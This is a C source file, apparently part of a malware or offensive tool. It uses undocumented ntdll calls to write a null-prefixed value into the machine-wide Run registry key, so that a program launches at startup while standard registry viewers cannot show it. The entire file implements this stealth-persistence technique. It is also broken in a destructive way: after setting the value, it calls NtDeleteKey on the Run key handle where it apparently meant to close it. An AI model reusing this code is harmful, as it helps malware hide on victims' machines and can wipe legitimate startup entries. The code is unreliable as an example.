#include"hideAutorun.h"

typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
#define STATUS_SUCCESS				((NTSTATUS)0x00000000L)
#define STATUS_BUFFER_OVERFLOW		((NTSTATUS)0x80000005L)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) == STATUS_SUCCESS)


NTSTATUS NtStatus = STATUS_SUCCESS;

HINSTANCE dllmodule = LoadLibrary(TEXT("ntdll.dll"));

LPNTOPENKEY NtOpenKey = (LPNTOPENKEY)GetProcAddress(dllmodule, "NtOpenKey");


LPNTSETVALUEKEY NtSetValueKey = (LPNTSETVALUEKEY)GetProcAddress(dllmodule, "NtSetValueKey");


LPNTDELETEKEY NtDeleteKey = (LPNTDELETEKEY)GetProcAddress(dllmodule, "NtDeleteKey");

LPNTDELETEVALUEKEY NtDeleteValueKey = (LPNTDELETEVALUEKEY)GetProcAddress(dllmodule, "NtDeleteValueKey");

LPNTCLOSE NtClose = (LPNTCLOSE)GetProcAddress(dllmodule, "NtClose");
LPRTLINITANSISTRING RtlInitAnsiString = (LPRTLINITANSISTRING)GetProcAddress(dllmodule, "RtlInitAnsiString");

LPRTLANSISTRINGTOUNICODESTRING RtlAnsiStringToUnicodeString = (LPRTLANSISTRINGTOUNICODESTRING)GetProcAddress(dllmodule, "RtlAnsiStringToUnicodeString");



HANDLE openKey(const char* csFullKey) {
	myUNICODE_STRING usKeyName;
	HANDLE hKey = NULL;
	HANDLE hMachineReg = 0x00000000;
	ANSI_STRING asKey;
	RtlZeroMemory(&asKey, sizeof(asKey));
	RtlInitAnsiString(&asKey, csFullKey);
	RtlZeroMemory(&usKeyName, sizeof(usKeyName));
	RtlAnsiStringToUnicodeString(&usKeyName, &asKey, TRUE);

	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes, &usKeyName, OBJ_CASE_INSENSITIVE, hMachineReg, NULL);

	NtStatus = NtOpenKey(&hKey, KEY_ALL_ACCESS, &ObjectAttributes);

	return hKey;
}


BOOL deleteKey(HANDLE hKey)
{
	NtStatus = NtDeleteKey(hKey);
	if (!NT_SUCCESS(NtStatus)) {

		return FALSE;
	}

	return TRUE;
}


BOOL setHideValueKey(HANDLE hKey, const  char* csName, const char* csData, DWORD dwRegType) {

	ANSI_STRING asName;
	RtlZeroMemory(&asName, sizeof(asName));
	RtlInitAnsiString(&asName, csName);
	asName.Length = strlen(csName + 2) + 2;
	asName.MaximumLength = strlen(csName + 2) + 2;
	myUNICODE_STRING ValueName;
	RtlZeroMemory(&ValueName, sizeof(ValueName));
	ValueName.Length = asName.Length * 2;
	ValueName.MaximumLength = asName.MaximumLength * 2;
	char* TempBuff;
	TempBuff = (char*)malloc(ValueName.Length);
	for (int i = 0; i < asName.Length; i++)
	{
		TempBuff[i * 2] = asName.Buffer[i];
		TempBuff[i * 2 + 1] = 0x00;
	}
	ValueName.Buffer = (WCHAR*)TempBuff;
	WCHAR wszValue[1024];
	unsigned int n;
	for (n = 0; n < strlen(csData); n++) {
		wszValue[n] = (WCHAR)csData[n];
	}
	wszValue[n++] = L'\0';
	NtStatus = NtSetValueKey(hKey,
		&ValueName,
		0,
		dwRegType,
		wszValue,
		(ULONG)strlen(csData) * sizeof(WCHAR));
	if (!NT_SUCCESS(NtStatus)) {
		printf("[!]NtSetValueKey Error:%ul\n", NtStatus);
		return FALSE;
	}

	return TRUE;
}



BOOL deleteHiddenValueKey(HANDLE hKey, LPCSTR csName) {
	ANSI_STRING asName;
	RtlZeroMemory(&asName, sizeof(asName));
	RtlInitAnsiString(&asName, csName);
	asName.Length = strlen(csName + 2) + 2;
	asName.MaximumLength = strlen(csName + 2) + 2;
	myUNICODE_STRING ValueName;
	RtlZeroMemory(&ValueName, sizeof(ValueName));

	ValueName.Length = asName.Length * 2;
	ValueName.MaximumLength = asName.MaximumLength * 2;
	char* TempBuff;
	TempBuff = (char*)malloc(ValueName.Length);
	for (int i = 0; i < asName.Length; i++)
	{
		TempBuff[i * 2] = asName.Buffer[i];
		TempBuff[i * 2 + 1] = 0x00;
	}
	ValueName.Buffer = (WCHAR*)TempBuff;
	NtStatus = NtDeleteValueKey(hKey, &ValueName);
	if (!NT_SUCCESS(NtStatus)) {
		return FALSE;
	}
	return TRUE;
}

DWORD hideautorun(LPCSTR keyname, LPCSTR keyvalue) {

	HANDLE hKey;
	hKey = openKey("\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");

	//setHideValueKey(hKey, "\0test2", "C:\\Users\\14927\\Desktop\\source.exe", REG_SZ);
	setHideValueKey(hKey, keyname, keyvalue, REG_SZ);
	/*deleteHiddenValueKey(hKey, "\0test2");*/

	deleteKey(hKey);

	return 0;
}

DWORD deletehideautorun(LPCSTR keyname) {
	HANDLE hKey;
	hKey = openKey("\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	deleteHiddenValueKey(hKey, keyname);
	return 0;
}